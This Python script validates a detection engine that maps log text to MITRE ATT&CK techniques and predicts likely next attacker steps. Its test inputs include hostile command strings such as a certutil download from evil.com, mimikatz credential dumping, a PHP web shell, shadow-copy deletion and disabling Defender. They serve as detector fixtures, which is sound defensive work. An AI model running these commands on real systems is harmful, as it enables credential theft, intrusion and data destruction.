#!/usr/bin/env python3
"""
PredictiveAttackPath — Standalone Validation Script

Tests the full offline pipeline without FastAPI or pytest:
  1. Regex pattern library integrity
  2. Log analysis against all 3 test logs
  3. Graph construction with mock data
  4. Prediction and attribution scoring

Run:  cd backend && python validate.py
"""

from __future__ import annotations

import sys
import time
import traceback
from pathlib import Path

# ── Setup ─────────────────────────────────────────────────────────
sys.path.insert(0, str(Path(__file__).resolve().parent))

PASS = "\033[92m✓ PASS\033[0m"
FAIL = "\033[91m✗ FAIL\033[0m"
WARN = "\033[93m⚠ WARN\033[0m"

test_results = {"pass": 0, "fail": 0, "warn": 0}


def run_test(name: str, fn):
    try:
        fn()
        print(f"  {PASS}  {name}")
        test_results["pass"] += 1
    except AssertionError as e:
        print(f"  {FAIL}  {name}: {e}")
        test_results["fail"] += 1
    except Exception as e:
        print(f"  {FAIL}  {name}: {type(e).__name__}: {e}")
        test_results["fail"] += 1


class AssertionError(Exception):
    pass


def assert_true(condition, msg=""):
    if not condition:
        raise AssertionError(msg)


def assert_gte(a, b, msg=""):
    if a < b:
        raise AssertionError(msg or f"{a} < {b}")


def assert_in(item, collection, msg=""):
    if item not in collection:
        raise AssertionError(msg or f"{item} not found in {collection}")


# ═══════════════════════════════════════════════════════════════════
print("\n" + "=" * 70)
print("  PREDICTIVE ATTACK PATH — FULL VALIDATION")
print("=" * 70)

# ── 1. Pattern Library ────────────────────────────────────────────
print("\n─── 1. REGEX PATTERN LIBRARY ───────────────────────────────")

from regex_patterns import (
    TECHNIQUE_PATTERNS,
    get_pattern_count,
    get_tactic_coverage,
    get_total_regex_count,
)

run_test("≥200 technique IDs covered",
         lambda: assert_gte(get_pattern_count(), 200,
                            f"Only {get_pattern_count()} techniques"))

run_test("≥500 individual regex patterns",
         lambda: assert_gte(get_total_regex_count(), 500,
                            f"Only {get_total_regex_count()} patterns"))

expected_tactics = {
    "reconnaissance", "resource-development", "initial-access",
    "execution", "persistence", "privilege-escalation",
    "defense-evasion", "credential-access", "discovery",
    "lateral-movement", "collection", "command-and-control",
    "exfiltration", "impact",
}
coverage = get_tactic_coverage()

run_test("All 14 tactics covered",
         lambda: assert_true(
             expected_tactics.issubset(coverage.keys()),
             f"Missing: {expected_tactics - set(coverage.keys())}"))

import re
tid_pattern = re.compile(r"^T\d{4}(\.\d{3})?$")
run_test("All technique IDs have valid format",
         lambda: assert_true(
             all(tid_pattern.match(t) for t in TECHNIQUE_PATTERNS),
             "Bad format detected"))

run_test("All entries have required fields",
         lambda: assert_true(
             all(
                 "name" in e and "tactic" in e and "patterns" in e and "confidence" in e
                 for e in TECHNIQUE_PATTERNS.values()
             )))

# ── 2. Log Analyzer ──────────────────────────────────────────────
print("\n─── 2. LOG ANALYZER — INDIVIDUAL TECHNIQUES ────────────────")

from log_analyzer import LogAnalyzer
analyzer = LogAnalyzer()


def detect_ids(log_text):
    return {d.technique_id for d in analyzer.analyze(log_text)}


# PowerShell
run_test("Detect T1059.001 (PowerShell)",
         lambda: assert_in("T1059.001", detect_ids(
             "powershell.exe -enc SQBFAFgA -ep bypass -windowstyle hidden")))

# Scheduled Task
run_test("Detect T1053.005 (Scheduled Task)",
         lambda: assert_in("T1053.005", detect_ids(
             'schtasks /create /tn "UpdateCheck" /tr "powershell.exe" /sc DAILY')))

# Registry Run Keys
run_test("Detect T1547.001 (Registry Run Keys)",
         lambda: assert_in("T1547.001", detect_ids(
             r'HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run')))

# LSASS Memory Dump
run_test("Detect T1003.001 (LSASS Memory)",
         lambda: assert_in("T1003.001", detect_ids(
             "sekurlsa::logonpasswords lsass.exe dump")))

# DCSync
run_test("Detect T1003.006 (DCSync)",
         lambda: assert_in("T1003.006", detect_ids(
             "mimikatz lsadump::dcsync")))

# Web Shell
run_test("Detect T1505.003 (Web Shell)",
         lambda: assert_in("T1505.003", detect_ids(
             "eval($_POST['cmd']); webshell china chopper")))

# Kerberoasting
run_test("Detect T1558.003 (Kerberoasting)",
         lambda: assert_in("T1558.003", detect_ids(
             "Invoke-Kerberoast hashcat -m 13100")))

# Event Log Clear
run_test("Detect T1070.001 (Clear Event Logs)",
         lambda: assert_in("T1070.001", detect_ids(
             "wevtutil cl Security")))

# Pass the Hash
run_test("Detect T1550.002 (Pass the Hash)",
         lambda: assert_in("T1550.002", detect_ids(
             "pass the hash mimikatz sekurlsa::pth")))

# Ingress Tool Transfer
run_test("Detect T1105 (Ingress Tool Transfer)",
         lambda: assert_in("T1105", detect_ids(
             "certutil -urlcache -split -f http://evil.com/p.exe")))

# Disable Defender
run_test("Detect T1562.001 (Disable Defender)",
         lambda: assert_in("T1562.001", detect_ids(
             "Set-MpPreference -DisableRealtimeMonitoring $true")))

# UAC Bypass
run_test("Detect T1548.002 (UAC Bypass)",
         lambda: assert_in("T1548.002", detect_ids(
             "fodhelper.exe uac bypass")))

# Ransomware
run_test("Detect T1486 (Ransomware)",
         lambda: assert_in("T1486", detect_ids(
             "ransomware encrypt file ransom bitcoin wallet")))

# DNS Tunneling
run_test("Detect T1071.004 (DNS C2)",
         lambda: assert_in("T1071.004", detect_ids(
             "dns tunnel dnscat c2")))

# Shadow Copy Deletion
run_test("Detect T1490 (Inhibit System Recovery)",
         lambda: assert_in("T1490", detect_ids(
             "vssadmin delete shadows /all")))

# Timestomp
run_test("Detect T1070.006 (Timestomp)",
         lambda: assert_in("T1070.006", detect_ids(
             "timestomp touch -t 202001010000")))

# Cryptomining
run_test("Detect T1496 (Resource Hijacking / Cryptomining)",
         lambda: assert_in("T1496", detect_ids(
             "xmrig monero mine stratum pool")))

# WMI Execution
run_test("Detect T1047 (WMI)",
         lambda: assert_in("T1047", detect_ids(
             "wmic process call create")))

# SMB Lateral Movement
run_test("Detect T1021.002 (SMB/Admin Shares)",
         lambda: assert_in("T1021.002", detect_ids(
             r"net use \\DC01\C$ /user:admin psexec")))

# Process Injection
run_test("Detect T1055 (Process Injection)",
         lambda: assert_in("T1055", detect_ids(
             "VirtualAllocEx WriteProcessMemory CreateRemoteThread inject process")))

# Empty log
run_test("Empty log → 0 detections",
         lambda: assert_true(len(analyzer.analyze("")) == 0))

# Benign log
run_test("Benign log → ≤3 false positives",
         lambda: assert_true(len(analyzer.analyze(
             "[INFO] App started on port 8080\n"
             "[INFO] DB connection pool: 10\n"
             "[INFO] User logged in\n"
             "[INFO] GET /api/users 200 45ms\n"
         )) <= 3))

# ── 3. Full Test Log Analysis ────────────────────────────────────
print("\n─── 3. FULL TEST LOG ANALYSIS ──────────────────────────────")

test_logs_dir = Path(__file__).resolve().parent.parent / "test_logs"

for log_file in sorted(test_logs_dir.glob("*.log")):
    log_text = log_file.read_text(encoding="utf-8")
    t0 = time.time()
    results = analyzer.analyze(log_text)
    elapsed = (time.time() - t0) * 1000

    tech_ids = {d.technique_id for d in results}
    tactics = {d.tactic for d in results}
    lines = len(log_text.split("\n"))

    print(f"\n  📄 {log_file.name} ({lines} lines)")
    print(f"     Detected: {len(results)} techniques across {len(tactics)} tactics in {elapsed:.1f}ms")

    run_test(f"{log_file.name}: ≥5 techniques detected",
             lambda r=results: assert_gte(len(r), 5,
                                          f"Only {len(r)} techniques"))

    run_test(f"{log_file.name}: ≥3 tactics covered",
             lambda t=tactics: assert_gte(len(t), 3,
                                          f"Only {len(t)} tactics"))

    # Print top 5 detections
    for det in sorted(results, key=lambda d: d.confidence, reverse=True)[:5]:
        conf_bar = "█" * int(det.confidence * 20)
        print(f"     {det.technique_id:12s} {det.technique_name:30s} [{det.confidence:.0%}] {conf_bar}")

# ── 4. APT29 Log — Key Technique Checks ─────────────────────────
print("\n─── 4. APT29 LOG — KEY TECHNIQUE VALIDATION ────────────────")

apt29_log = (test_logs_dir / "apt29_simulation.log").read_text(encoding="utf-8")
apt29_detected = detect_ids(apt29_log)

for expected_tid, expected_name in [
    ("T1059.001", "PowerShell"),
    ("T1053.005", "Scheduled Task"),
    ("T1547.001", "Registry Run Keys"),
    ("T1003.001", "LSASS Memory Dump"),
    ("T1070.001", "Clear Event Logs"),
    ("T1562.001", "Disable Defender"),
    ("T1550.002", "Pass the Hash"),
    ("T1082", "System Information Discovery"),
]:
    run_test(f"APT29 log detects {expected_tid} ({expected_name})",
             lambda t=expected_tid: assert_in(t, apt29_detected,
                                              f"{t} not in {apt29_detected}"))

# ── 5. Graph Construction & Prediction ───────────────────────────
print("\n─── 5. GRAPH CONSTRUCTION & PREDICTION ─────────────────────")

from mitre_data_loader import IntrusionSet, MitreDataset, Technique
from technique_graph import TechniqueGraph

# Build mock dataset
mock_ds = MitreDataset()
for i in range(1, 16):
    tid = f"T{1000 + i}"
    mock_ds.techniques[tid] = Technique(
        technique_id=tid,
        stix_id=f"attack-pattern--{i:04d}",
        name=f"MockTechnique-{i}",
        tactics=["execution"] if i <= 8 else ["persistence"],
    )

mock_ds.groups["G0001"] = IntrusionSet(
    group_id="G0001", stix_id="is--0001", name="MockAPT-Alpha",
    aliases=["Alpha", "Bear-A"],
    technique_ids=["T1001", "T1002", "T1003", "T1004", "T1009", "T1010"],
)
mock_ds.groups["G0002"] = IntrusionSet(
    group_id="G0002", stix_id="is--0002", name="MockAPT-Beta",
    aliases=["Beta", "Bear-B"],
    technique_ids=["T1002", "T1003", "T1005", "T1006", "T1011"],
)
mock_ds.groups["G0003"] = IntrusionSet(
    group_id="G0003", stix_id="is--0003", name="MockAPT-Gamma",
    aliases=["Gamma"],
    technique_ids=["T1003", "T1005", "T1006", "T1007", "T1008", "T1012"],
)

mock_graph = TechniqueGraph(mock_ds)

run_test("Graph has 15 nodes",
         lambda: assert_true(mock_graph.graph.number_of_nodes() == 15,
                             f"Got {mock_graph.graph.number_of_nodes()}"))

run_test("Graph has edges",
         lambda: assert_true(mock_graph.graph.number_of_edges() > 0,
                             "No edges"))

# T1002-T1003 shared by G0001 and G0002 → weight 2
run_test("Edge T1002↔T1003 has weight=2 (shared by 2 groups)",
         lambda: assert_true(
             mock_graph.graph["T1002"]["T1003"]["weight"] == 2,
             f"Got weight={mock_graph.graph['T1002']['T1003']['weight']}"))

# Predictions
predictions, attributions, path = mock_graph.predict_next_techniques(
    detected_ids=["T1001", "T1002", "T1003"]
)

run_test("Predictions returned",
         lambda: assert_true(len(predictions) > 0, "No predictions"))

run_test("Detected techniques excluded from predictions",
         lambda: assert_true(
             all(p.technique_id not in {"T1001", "T1002", "T1003"}
                 for p in predictions),
             "Detected tech in predictions"))

run_test("Attributions returned",
         lambda: assert_true(len(attributions) > 0, "No attributions"))

run_test("Top attribution is MockAPT-Alpha (uses all 3 detected)",
         lambda: assert_true(
             attributions[0].group_name == "MockAPT-Alpha",
             f"Got {attributions[0].group_name}"))

run_test("Attack path has stages",
         lambda: assert_true(len(path) > 0, "No attack path"))

# Attribution boost test
preds_no_boost, _, _ = mock_graph.predict_next_techniques(
    detected_ids=["T1001", "T1002", "T1003"],
    enable_attribution_boost=False,
)
preds_boosted, _, _ = mock_graph.predict_next_techniques(
    detected_ids=["T1001", "T1002", "T1003"],
    enable_attribution_boost=True,
)

# T1004 is in G0001 (top attributed) → should get boosted
score_no = next((p.probability for p in preds_no_boost if p.technique_id == "T1004"), 0)
score_yes = next((p.probability for p in preds_boosted if p.technique_id == "T1004"), 0)

run_test("Attribution boost increases score for group techniques",
         lambda: assert_true(score_yes >= score_no,
                             f"Boosted {score_yes} < non-boosted {score_no}"))

# ── 6. Coverage Report ───────────────────────────────────────────
print("\n─── 6. PATTERN COVERAGE REPORT ─────────────────────────────")
print(f"\n  Total technique IDs:    {get_pattern_count()}")
print(f"  Total regex patterns:   {get_total_regex_count()}")
print(f"  Avg patterns/technique: {get_total_regex_count() / max(get_pattern_count(), 1):.1f}")
print()
for tactic, count in sorted(coverage.items(), key=lambda x: -x[1]):
    bar = "█" * min(count, 60)
    print(f"  {tactic:30s} {count:4d}  {bar}")

# ── Summary ──────────────────────────────────────────────────────
print("\n" + "=" * 70)
total = test_results["pass"] + test_results["fail"]
print(f"  RESULTS: {test_results['pass']}/{total} passed, "
      f"{test_results['fail']} failed")

if test_results["fail"] == 0:
    print("  \033[92m★ ALL TESTS PASSED — Engine validated successfully\033[0m")
else:
    print(f"  \033[91m✗ {test_results['fail']} FAILURES — Review above\033[0m")

print("=" * 70 + "\n")
sys.exit(1 if test_results["fail"] > 0 else 0)
